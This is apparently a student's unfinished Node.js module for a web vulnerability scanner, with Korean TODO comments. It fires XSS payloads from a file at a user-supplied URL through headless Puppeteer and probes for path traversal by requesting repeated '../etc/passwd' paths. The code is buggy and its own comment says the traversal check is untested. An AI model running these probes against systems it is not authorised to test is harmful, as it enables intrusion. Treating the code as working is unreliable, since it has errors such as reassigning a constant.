const fs = require('fs');
const readline = require('readline');
const open = require('open');
const puppeteer = require('puppeteer');
const http = require('http');
const { response } = require('express');

const array = fs.readFileSync('payload.txt').toString().split("\n");

//input 태그 찾는 로직 추가해야됨, front: 데이터 넘어가면 result 페이지로 redirect 시켜야됨
const xss_scan = async(req, res) => {
    const url = req.body.href;

    for (let i in array) {
        try {
          let victim_url = url + array[i];
          console.log(victim_url);
      
          const browser = await puppeteer.launch({headless:'new'});
          const page = await browser.newPage();

          await page.setDefaultNavigationTimeout(1);
          await page.goto(victim_url);
          await browser.close();

        } catch (error) {
          continue;
        }
      }
};

//path traversal 취약점 스캔로직 (아직 검증 못함)
const pathtraversal_scan = async(req, res) => {
  const url =req.body.href;
  const payload = "../";
  const i = 0;
  let success_url = [];

  for (let i = 0; i < 10; i++) {
    try{
      let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
      http.request(victim_url, (response) => {
        const status = response.statusCode;
        if(status == 200){
         success_url.push(victim_url); 
        }
        console.log(status);
        console.log(success_url);
      })
    }catch(error){
      console.log(error);
    }
  }
  console.log(success_url);
}

//victim_url을 result page로 보내고 result page에서 몇개의 xss가 성공했는지 result해서 result output 해주는 로직을 짜야함
const resultCount = 0

const result = async(req, res) => {
    console.log("※SUCCESS※");
    console.log("Scanning count is" + resultCount);
    // console.log("Payload is" + victim_url);
    console.log("---------------------------------------------------------")
    resultCount += 1
}

module.exports = {
    xss_scan,
    pathtraversal_scan,
    result,
}